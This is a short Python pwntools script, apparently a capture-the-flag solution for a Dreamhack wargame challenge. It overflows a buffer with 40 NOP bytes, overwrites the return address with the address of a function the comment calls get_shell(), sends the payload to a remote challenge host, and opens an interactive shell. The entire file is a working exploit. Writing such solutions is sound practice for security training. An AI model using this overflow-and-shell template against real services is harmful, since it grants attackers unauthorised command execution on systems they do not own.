from pwn import *

# buf + get_shell()
payload = b'\x90'*40 + b'\x7b\x86\x04\x08'
r = remote('host3.dreamhack.games', 18645)

r.send(payload)

r.interactive()